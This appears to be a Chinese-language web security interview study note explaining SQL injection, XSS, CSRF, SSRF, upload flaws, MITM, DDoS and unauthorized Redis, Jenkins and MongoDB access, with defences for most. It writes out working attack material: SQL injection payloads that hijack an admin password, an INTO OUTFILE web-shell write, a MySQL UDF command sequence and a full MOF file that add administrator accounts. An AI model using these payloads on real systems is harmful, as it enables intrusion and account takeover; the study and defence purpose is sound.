<h2 id="SQL注入防护"><a href="#SQL注入防护" class="headerlink" title=" SQL注入防护"></a><span id="head9"> SQL注入防护</span></h2><p>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。<br>\6. 规范编码,字符集</p>
<h2 id="为什么参数化查询可以防止sql注入"><a href="#为什么参数化查询可以防止sql注入" class="headerlink" title=" 为什么参数化查询可以防止sql注入"></a><span id="head10"> 为什么参数化查询可以防止sql注入</span></h2><p>原理:</p>
<p>使用参数化查询数据库服务器不会把参数的内容当作sql指令的一部分来执行，是在数据库完成sql指令的编译后才套用参数运行</p>
<p>简单的说:<br>参数化能防注入的原因在于,语句是语句，参数是参数，参数的值并不是语句的一部分，数据库只按语句的语义跑</p>
<h2 id="SQL头注入点"><a href="#SQL头注入点" class="headerlink" title=" SQL头注入点"></a><span id="head11"> SQL头注入点</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UA</span><br><span class="line">REFERER</span><br><span class="line">COOKIE</span><br><span class="line">IP</span><br></pre></td></tr></table></figure>

<h2 id="盲注是什么？怎么盲注？"><a href="#盲注是什么？怎么盲注？" class="headerlink" title=" 盲注是什么？怎么盲注？"></a><span id="head12"> 盲注是什么？怎么盲注？</span></h2><p>盲注是在SQL注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在SQL注入和利用的方式。盲注的手段有两种，一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入。一个是通过sql语句处理时间的不同来判断是否存在注入(time-based)，在这里，可以用benchmark，sleep等造成延时效果的函数，也可以通过构造大笛卡儿积的联合查询表来达到延时的目的。</p>
<h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title=" 宽字节注入产生原理以及根本原因"></a><span id="head13"> 宽字节注入产生原理以及根本原因</span></h2><h3 id="产生原理"><a href="#产生原理" class="headerlink" title=" 产生原理"></a><span id="head14"> 产生原理</span></h3><p>在数据库使用了宽字符集而WEB中没考虑这个问题的情况下，在WEB层，由于0XBF27是两个字符，在PHP中比如addslash和magic_quotes_gpc开启时，由于会对0x27单引号进行转义，因此0xbf27会变成0xbf5c27,而数据进入数据库中时，由于0XBF5C是一个另外的字符，因此\转义符号会被前面的bf带着”吃掉”，单引号由此逃逸出来可以用来闭合语句。</p>
<h3 id="在哪里编码"><a href="#在哪里编码" class="headerlink" title=" 在哪里编码"></a><span id="head15"> 在哪里编码</span></h3><h3 id="根本原因"><a href="#根本原因" class="headerlink" title=" 根本原因"></a><span id="head16"> 根本原因</span></h3><p>character_set_client(客户端的字符集)和character_set_connection(连接层的字符集)不同,或转换函数如，iconv、mb_convert_encoding使用不当。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title=" 解决办法"></a><span id="head17"> 解决办法</span></h3><p>统一数据库、Web应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为UTF-8。<br>或对数据进行正确的转义，如mysql_real_escape_string+mysql_set_charset的使用。</p>
<h3 id="sql里面只有update怎么利用"><a href="#sql里面只有update怎么利用" class="headerlink" title=" sql里面只有update怎么利用"></a><span id="head18"> sql里面只有update怎么利用</span></h3><p>先理解这句 SQL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5($password)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>如果此 SQL 被修改成以下形式，就实现了注入</p>
<p>1：修改 homepage 值为<code>http://xxx.net&#39;, userlevel=&#39;3</code></p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;mypass&apos;, homepage=&apos;http://xxx.net&apos;, userlevel=&apos;3&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>userlevel 为用户级别</p>
<p>2:修改 password 值为<code>mypass)&#39; WHERE username=&#39;admin&#39;#</code></p>
<p>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5(mypass)&apos; WHERE username=&apos;admin&apos;#)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;$id&apos;</span><br></pre></td></tr></table></figure>

<p>3：修改 id 值为<code>&#39; OR username=&#39;admin&#39;</code><br>之后 SQL 语句变为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE user SET password=&apos;MD5($password)&apos;, homepage=&apos;$homepage&apos; WHERE id=&apos;&apos; OR username=&apos;admin&apos;</span><br></pre></td></tr></table></figure>

<h2 id="sql如何写shell-单引号被过滤怎么办"><a href="#sql如何写shell-单引号被过滤怎么办" class="headerlink" title=" sql如何写shell/单引号被过滤怎么办"></a><span id="head19"> sql如何写shell/单引号被过滤怎么办</span></h2><p>写shell: root权限，GPC关闭，知道文件路径<br>outfile函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`http://127.0.0.1:81/sqli.php?id=1 into outfile &apos;C:\\wamp64\\www\\phpinfo.php&apos; FIELDS TERMINATED BY &apos;&lt;?php phpinfo(); ?&gt;&apos;`</span><br><span class="line"></span><br><span class="line">`http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &apos;C:\\wamp64\\www\\phpinfo.php&apos;`</span><br></pre></td></tr></table></figure>

<p>宽字节注入</p>
<h3 id="代替空格的方法"><a href="#代替空格的方法" class="headerlink" title=" 代替空格的方法"></a><span id="head20"> 代替空格的方法</span></h3><p>%0a、%0b、%a0 等<br>/**/ 等注释符<br>&lt;&gt;</p>
<h3 id="mysql的网站注入，5-0以上和5-0以下有什么区别？"><a href="#mysql的网站注入，5-0以上和5-0以下有什么区别？" class="headerlink" title=" mysql的网站注入，5.0以上和5.0以下有什么区别？"></a><span id="head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</span></h3><p>5.0以下没有information_schema这个系统表，无法列表名等，只能暴力跑表名。</p>
<p>5.0以下是多用户单操作，5.0以上是多用户多操做。</p>
<h1 id="XSS"><a href="#XSS" class="headerlink" title=" XSS"></a><span id="head22"> XSS</span></h1><h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title=" XSS原理"></a><span id="head23"> XSS原理</span></h2><h3 id="反射型"><a href="#反射型" class="headerlink" title=" 反射型"></a><span id="head24"> 反射型</span></h3><p>用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。<br>需要诱使用户“点击”一个恶意链接，才能攻击成功</p>
<h3 id="储存型"><a href="#储存型" class="headerlink" title=" 储存型"></a><span id="head25"> 储存型</span></h3><p>存储型XSS会把用户输入的数据“存储”在服务器端。<br>这种XSS具有很强的稳定性。</p>
<h3 id="DOM型"><a href="#DOM型" class="headerlink" title=" DOM型"></a><span id="head26"> DOM型</span></h3><p>通过修改页面的DOM节点形成的XSS，称之为DOM Based XSS。</p>
<h2 id="DOM型和反射型的区别"><a href="#DOM型和反射型的区别" class="headerlink" title=" DOM型和反射型的区别"></a><span id="head27"> DOM型和反射型的区别</span></h2><p>反射型XSS：通过诱导用户点击，我们构造好的恶意payload才会触发的XSS。<br>反射型XSS的检测我们在每次请求带payload的链接时页面应该是会带有特定的畸形数据的。<br>DOM型：通过修改页面的DOM节点形成的XSS。<br>DOM-based XSS由于是通过js代码进行dom操作产生的XSS，所以在请求的响应中我们甚至不一定会得到相应的畸形数据。<br>根本区别在我看来是输出点的不同。</p>
<h2 id="DOM型XSS-自动化测试或人工测试"><a href="#DOM型XSS-自动化测试或人工测试" class="headerlink" title="DOM型XSS 自动化测试或人工测试"></a><span id="head28">DOM型XSS 自动化测试或人工测试</span></h2><p>人工测试思路：找到类似document.write、innerHTML赋值、outterHTML赋值、window.location操作、写javascript:后内容、eval、setTimeout 、setInterval 等直接执行之类的函数点。找到其变量，回溯变量来源观察是否可控，是否经过安全函数。<br>自动化测试参看道哥的博客，思路是从输入入手，观察变量传递的过程，最终检查是否有在危险函数输出，中途是否有经过安全函数。但是这样就需要有一个javascript解析器，否则会漏掉一些通过js执行带入的部分内容。</p>
<p>在回答这段问题的时候，由于平时对客户的检测中，基本是凭借不同功能点的功能加上经验和直觉来进行检测，对不同类型的XSS检测方式实际上并没有太过细分的标准化检测方式，所以回答的很烂。。。</p>
<h2 id="如何快速发现xss位置"><a href="#如何快速发现xss位置" class="headerlink" title=" 如何快速发现xss位置"></a><span id="head29"> 如何快速发现xss位置</span></h2><h2 id="对于XSS怎么修补建议"><a href="#对于XSS怎么修补建议" class="headerlink" title=" 对于XSS怎么修补建议"></a><span id="head30"> 对于XSS怎么修补建议</span></h2><p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。</p>
<p>输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Javascript脚本中时，对其进行JavascriptEncode。<br>对使用JavascriptEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Javascript的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。</p>
<p>除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
<h2 id="XSS蠕虫的产生条件"><a href="#XSS蠕虫的产生条件" class="headerlink" title=" XSS蠕虫的产生条件"></a><span id="head31"> XSS蠕虫的产生条件</span></h2><p>正常情况下，一个是产生XSS点的页面不属于self页面，用户之间产生交互行为的页面，都可能造成XSS Worm的产生。<strong>不一定需要</strong>存储型XSS</p>
<h1 id="CSRF"><a href="#CSRF" class="headerlink" title=" CSRF"></a><span id="head32"> CSRF</span></h1><h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title=" CSRF原理"></a><span id="head33"> CSRF原理</span></h2><p>CSRF是跨站请求伪造攻击，由客户端发起,是由于没有在关键操作执行时进行是否由用户自愿发起的确认</p>
<h2 id="防御"><a href="#防御" class="headerlink" title=" 防御"></a><span id="head34"> 防御</span></h2><ul>
<li>验证Referer</li>
<li>添加token</li>
</ul>
<h2 id="token和referer做横向对比，谁安全等级高？"><a href="#token和referer做横向对比，谁安全等级高？" class="headerlink" title=" token和referer做横向对比，谁安全等级高？"></a><span id="head35"> token和referer做横向对比，谁安全等级高？</span></h2><p>token安全等级更高，因为并不是任何服务器都可以取得referer，如果从HTTPS跳到HTTP，也不会发送referer。并且FLASH一些版本中可以自定义referer。<br>但是token的话，要保证其足够随机且不可泄露。(不可预测性原则)</p>
<h2 id="对referer的验证，从什么角度去做？如果做，怎么杜绝问题"><a href="#对referer的验证，从什么角度去做？如果做，怎么杜绝问题" class="headerlink" title=" 对referer的验证，从什么角度去做？如果做，怎么杜绝问题"></a><span id="head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</span></h2><p>对header中的referer的验证，一个是空referer，一个是referer过滤或者检测不完善。<br>为了杜绝这种问题，在验证的白名单中，正则规则应当写完善。</p>
<h2 id="针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"><a href="#针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？" class="headerlink" title=" 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？"></a><span id="head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</span></h2><p>引用一段请教前辈的回答：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">针对token的攻击，一是对它本身的攻击，重放测试一次性、分析加密规则、校验方式是否正确等，二是结合信息泄露漏洞对它的获取，结合着发起组合攻击</span><br><span class="line">信息泄露有可能是缓存、日志、get，也有可能是利用跨站</span><br><span class="line">很多跳转登录的都依赖token，有一个跳转漏洞加反射型跨站就可以组合成登录劫持了</span><br><span class="line">另外也可以结合着其它业务来描述token的安全性及设计不好怎么被绕过比如抢红包业务之类的</span><br></pre></td></tr></table></figure>

<h1 id="SSRF"><a href="#SSRF" class="headerlink" title=" SSRF"></a><span id="head38"> SSRF</span></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
<h2 id="检测"><a href="#检测" class="headerlink" title=" 检测"></a><span id="head39"> 检测</span></h2><p>SSRF漏洞的验证方法：</p>
<p>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的，从而来判断是否存在SSRF漏洞</p>
<p>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞 4</a></p>
<h2 id="SSRF漏洞的成因-防御-绕过"><a href="#SSRF漏洞的成因-防御-绕过" class="headerlink" title="SSRF漏洞的成因 防御 绕过"></a><span id="head40">SSRF漏洞的成因 防御 绕过</span></h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。<br>利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻击。<br>防御：禁止跳转，限制协议，内外网限制，URL限制。<br>绕过：使用不同协议，针对IP，IP格式的绕过，针对URL，恶意URL增添其他字符，@之类的。301跳转+dns rebindding。</p>
<h1 id="上传"><a href="#上传" class="headerlink" title=" 上传"></a><span id="head41"> 上传</span></h1><h2 id="文件上传漏洞原理"><a href="#文件上传漏洞原理" class="headerlink" title=" 文件上传漏洞原理"></a><span id="head42"> 文件上传漏洞原理</span></h2><p>由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致用户可以越过其本身权限向服务器上传可执行的动态脚本文件</p>
<h2 id="常见的上传绕过方式"><a href="#常见的上传绕过方式" class="headerlink" title=" 常见的上传绕过方式"></a><span id="head43"> 常见的上传绕过方式</span></h2><ul>
<li>前端js验证：禁用js/burp改包</li>
<li>大小写</li>
<li>双重后缀名</li>
<li>过滤绕过 pphphp-&gt;php</li>
</ul>
<h2 id="防护"><a href="#防护" class="headerlink" title=" 防护"></a><span id="head44"> 防护</span></h2><ul>
<li>文件上传目录设置为不可执行</li>
<li>使用白名单判断文件上传类型</li>
<li>用随机数改写文件名和路径</li>
</ul>
<h2 id="审查上传点的元素有什么意义？"><a href="#审查上传点的元素有什么意义？" class="headerlink" title=" 审查上传点的元素有什么意义？"></a><span id="head45"> 审查上传点的元素有什么意义？</span></h2><p>有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<h1 id="文件包含"><a href="#文件包含" class="headerlink" title=" 文件包含"></a><span id="head46"> 文件包含</span></h1><h2 id="原理"><a href="#原理" class="headerlink" title=" 原理"></a><span id="head47"> 原理</span></h2><p>引入一段用户能控制的脚本或代码，并让服务器端执行<br>（1）include()等函数通过动态变量的方式引入需要包含的文件；<br>（2）用户能够控制该动态变量。</p>
<h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title=" 导致文件包含的函数"></a><span id="head48"> 导致文件包含的函数</span></h2><p>PHP：include(), include_once(), require(), re-quire_once(), fopen(), readfile(), …<br>JSP/Servlet：ava.io.File(), java.io.Fil-eReader(), …<br>ASP：include file, include virtual,</p>
<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title=" 本地文件包含"></a><span id="head49"> 本地文件包含</span></h2><p>能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title=" XXE"></a><span id="head50"> XXE</span></h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title=" 逻辑漏洞"></a><span id="head51"> 逻辑漏洞</span></h1><h2 id="金融行业常见逻辑漏洞"><a href="#金融行业常见逻辑漏洞" class="headerlink" title=" 金融行业常见逻辑漏洞"></a><span id="head52"> 金融行业常见逻辑漏洞</span></h2><p>单针对金融业务的<br>主要是数据的篡改(涉及金融数据，或部分业务的判断数据)，由竞争条件或者设计不当引起的薅羊毛，交易/订单信息泄露，水平越权对别人的账户查看或恶意操作，交易或业务步骤绕过。</p>
<h1 id="溢出"><a href="#溢出" class="headerlink" title=" 溢出"></a><span id="head53"> 溢出</span></h1><h1 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title=" 中间人攻击"></a><span id="head54"> 中间人攻击</span></h1><p>中间人攻击是一个（缺乏）相互认证的攻击；由于客户端与服务器之间在SSL握手的过程中缺乏相互认证而造成的漏洞</p>
<p>防御中间人攻击的方案通常基于一下几种技术</p>
<p>1.公钥基础建设PKI<br>使用PKI相互认证机制，客户端验证服务器，服务器验证客户端；上述两个例子中都是只验证服务器，这样就造成了SSL握手环节的漏洞，而如果使用相互认证的的话，基本可以更强力的相互认证</p>
<p>2.延迟测试</p>
<p>使用复杂加密哈希函数进行计算以造成数十秒的延迟；如果双方通常情况下都要花费20秒来计算，并且整个通讯花费了60秒计算才到达对方，这就能表明存在第三方中间人。</p>
<p>3.使用其他形式的密钥交换形式</p>
<h2 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title=" ARP欺骗"></a><span id="head55"> ARP欺骗</span></h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title=" 原理:"></a><span id="head56"> 原理:</span></h3><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。<br>在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。这样攻击者就有了偷听主机传输的数据的可能</p>
<h3 id="防护-1"><a href="#防护-1" class="headerlink" title=" 防护"></a><span id="head57"> 防护</span></h3><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p>
<p>2.在网关绑定主机MAC与IP地址</p>
<p>3.使用ARP防火墙</p>
<h1 id="DDOS"><a href="#DDOS" class="headerlink" title=" DDOS"></a><span id="head58"> DDOS</span></h1><h2 id="Ddos原理"><a href="#Ddos原理" class="headerlink" title=" Ddos原理"></a><span id="head59"> Ddos原理</span></h2><p>利用合理的请求造成资源过载，导致服务不可用</p>
<h3 id="syn洪流的原理"><a href="#syn洪流的原理" class="headerlink" title=" syn洪流的原理"></a><span id="head60"> syn洪流的原理</span></h3><p>伪造大量的源IP地址，分别向服务器端发送大量的SYN包，此时服务器端会返回SYN/ACK包，因为源地址是伪造的，所以伪造的IP并不会应答，服务器端没有收到伪造IP的回应，会重试3～5次并且等待一个SYNTime（一般为30秒至2分钟），如果超时则丢弃这个连接。攻击者大量发送这种伪造源地址的SYN请求，服务器端将会消耗非常多的资源（CPU和内存）来处理这种半连接，同时还要不断地对这些IP进行SYN+ACK重试。最后的结果是服务器无暇理睬正常的连接请求，导致拒绝服务。</p>
<h3 id="CC攻击原理"><a href="#CC攻击原理" class="headerlink" title=" CC攻击原理"></a><span id="head61"> CC攻击原理</span></h3><p>对一些消耗资源较大的应用页面不断发起正常的请求，以达到消耗服务端资源的目的。</p>
<h2 id="DDOS防护"><a href="#DDOS防护" class="headerlink" title=" DDOS防护"></a><span id="head62"> DDOS防护</span></h2><p>SYN Cookie/SYN Proxy、safereset等算法。SYN Cookie的主要思想是为每一个IP地址分配一个“Cookie”，并统计每个IP地址的访问频率。如果在短时间内收到大量的来自同一个IP地址的数据包，则认为受到攻击，之后来自这个IP地址的包将被丢弃。</p>
<h1 id="提权"><a href="#提权" class="headerlink" title=" 提权"></a><span id="head63"> 提权</span></h1><h2 id="mysql两种提权方式"><a href="#mysql两种提权方式" class="headerlink" title=" mysql两种提权方式"></a><span id="head64"> mysql两种提权方式</span></h2><p>udf提权,mof提权</p>
<h3 id="Mysql-UDF提权"><a href="#Mysql-UDF提权" class="headerlink" title=" Mysql_UDF提权"></a><span id="head65"> Mysql_UDF提权</span></h3><p>要求:<br>1.目标系统是Windows(Win2000,XP,Win2003)；<br>2.拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数<br>3.有root账号密码<br>导出udf:<br>MYSQL 5.1以上版本，必须要把udf.dll文件放到MYSQL安装目录下的lib\plugin文件夹下才能创建自定义函数<br>可以再mysql里输入<br><code>select @@basedir</code><br><code>show variables like ‘%plugins%’</code> 寻找mysql安装路径<br>提权:</p>
<p>使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一）returns string soname ‘导出的DLL路径’；</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create function cmdshell returns string soname ‘udf.dll’</span><br><span class="line">select cmdshell(‘net user arsch arsch /add’);</span><br><span class="line">select cmdshell(‘net localgroup administrators arsch /add’);</span><br><span class="line"></span><br><span class="line">drop function cmdshell;</span><br></pre></td></tr></table></figure>

<p>该目录默认是不存在的，这就需要我们使用webshell找到MYSQL的安装目录，并在安装目录下创建lib\plugin文件夹，然后将udf.dll文件导出到该目录即可。</p>
<h3 id="Mysql-mof提权"><a href="#Mysql-mof提权" class="headerlink" title="Mysql mof提权"></a><span id="head66">Mysql mof提权</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name  = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer   = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第18行的命令，上传前请自己更改。</p>
<p>2、执行load_file及into dumpfile把文件导出到正确的位置即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load file(&apos;c:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullevt.mov&apos;</span><br></pre></td></tr></table></figure>

<p>执行成功后，即可添加一个普通用户，然后你可以更改命令，再上传导出执行把用户提升到管理员权限，然后3389连接之就ok了。</p>
<h1 id="特殊漏洞"><a href="#特殊漏洞" class="headerlink" title=" 特殊漏洞"></a><span id="head67"> 特殊漏洞</span></h1><h2 id="Struts2-045"><a href="#Struts2-045" class="headerlink" title=" Struts2-045"></a><span id="head68"> Struts2-045</span></h2><h2 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title=" Redis未授权访问"></a><span id="head69"> Redis未授权访问</span></h2><h3 id="产生原因"><a href="#产生原因" class="headerlink" title=" 产生原因"></a><span id="head70"> 产生原因</span></h3><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器</p>
<h3 id="利用条件和方法"><a href="#利用条件和方法" class="headerlink" title=" 利用条件和方法"></a><span id="head71"> 利用条件和方法</span></h3><p>条件:</p>
<ol>
<li>redis服务以root账户运行</li>
<li>redis无密码或弱密码进行认证</li>
<li>redis监听在0.0.0.0公网上</li>
</ol>
<p>方法:</p>
<ul>
<li>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫</li>
<li>上传SSH公钥获得SSH登录权限</li>
<li>通过crontab反弹shell</li>
<li>slave主从模式利用</li>
</ul>
<h3 id="修复"><a href="#修复" class="headerlink" title=" 修复"></a><span id="head72"> 修复</span></h3><ul>
<li>密码验证</li>
<li>降权运行</li>
<li>限制ip/修改端口</li>
</ul>
<h2 id="Jenkins未授权访问"><a href="#Jenkins未授权访问" class="headerlink" title=" Jenkins未授权访问"></a><span id="head73"> Jenkins未授权访问</span></h2><p>攻击者通过未授权访问进入脚本命令执行界面执行攻击指令</p>
<p><code>println &quot;ifconfig -a&quot;.execute().text</code> 执行一些系统命令,利用wget下载webshell</p>
<h2 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title=" MongoDB未授权访问"></a><span id="head74"> MongoDB未授权访问</span></h2><p>开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,而且可以远程访问数据库，登录的用户可以通过默认端口无需密码对数据库进行增、删、改、查等任意高危操作。</p>
<h3 id="防护-2"><a href="#防护-2" class="headerlink" title=" 防护"></a><span id="head75"> 防护</span></h3><p>1、为MongoDB添加认证：<br>1)MongoDB启动时添加–auth参数<br>2)给MongoDB添加用户：<br>use admin #使用admin库<br>db.addUser(“root”, “123456”) #添加用户名root密码123456的用户<br>db.auth(“root”,“123456”) #验证下是否添加成功，返回1说明成功<br>2、禁用HTTP和REST端口<br>MongoDB自身带有一个HTTP服务和并支持REST接口。在2.6以后这些接口默认是关闭的。mongoDB默认会使用默认端口监听web服务，一般不需要通过web方式进行远程管理，建议禁用。修改配置文件或在启动的时候选择–nohttpinterface 参数nohttpinterface=false<br>3、限制绑定IP<br>启动时加入参数<br>–bind_ip 127.0.0.1<br>或在/etc/mongodb.conf文件中添加以下内容：<br>bind_ip = 127.0.0.1</p>
<h2 id="Memcache未授权访问"><a href="#Memcache未授权访问" class="headerlink" title=" Memcache未授权访问"></a><span id="head76"> Memcache未授权访问</span></h2><p>Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcache服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息。</p>
<h3 id="利用"><a href="#利用" class="headerlink" title=" 利用"></a><span id="head77"> 利用</span></h3><p>1、登录机器执行netstat -an |more命令查看端口监听情况。回显0.0.0.0:11211表示在所有网卡进行监听，存在memcached未授权访问漏洞。</p>
<p>2、telnet 11211，或nc -vv 11211，提示连接成功表示漏洞存在</p>
<h3 id="漏洞加固"><a href="#漏洞加固" class="headerlink" title=" 漏洞加固"></a><span id="head78"> 漏洞加固</span></h3><ul>
<li>1、设置memchached只允许本地访问</li>
<li>2、禁止外网访问Memcached 11211端口</li>
<li>3、编译时加上–enable-sasl，启用SASL认证</li>
</ul>
<h2 id="FFMPEG-本地文件读取漏洞"><a href="#FFMPEG-本地文件读取漏洞" class="headerlink" title="FFMPEG 本地文件读取漏洞"></a><span id="head79">FFMPEG 本地文件读取漏洞</span></h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title=" 原理"></a><span id="head80"> 原理</span></h3><p>通过调用加密API将payload加密放入一个会被执行的段字节中。但是具体回答工程中我只回答道了SSRF老洞，m3u8头，偏移量，加密。</p>
<h1 id="安全知识"><a href="#安全知识" class="headerlink" title=" 安全知识"></a><span id="head81"> 安全知识</span></h1><h2 id="WEB"><a href="#WEB" class="headerlink" title=" WEB"></a><span id="head82"> WEB</span></h2><h3 id="常用WEB开发JAVA框架"><a href="#常用WEB开发JAVA框架" class="headerlink" title=" 常用WEB开发JAVA框架"></a><span id="head83"> 常用WEB开发JAVA框架</span></h3><p>STRUTS,SPRING<br>常见的java框架漏洞<br>其实面试官问这个问题的时候我不太清楚他要问什么，我提到struts的045 048，java常见反序列化。<br>045 错误处理引入了ognl表达式<br>048 封装action的过程中有一步调用getstackvalue递归获取ognl表达式<br>反序列化 操作对象，通过手段引入。apache common的反射机制、readobject的重写，其实具体的我也记不清楚。。。然后这部分就结束了</p>
<h3 id="同源策略"><a href="#同源策略" class="headerlink" title=" 同源策略"></a><span id="head84"> 同源策略</span></h3><p>同源策略限制不同源对当前document的属性内容进行读取或设置。<br>不同源的区分：协议、域名、子域名、IP、端口，以上有不同时即不同源。</p>
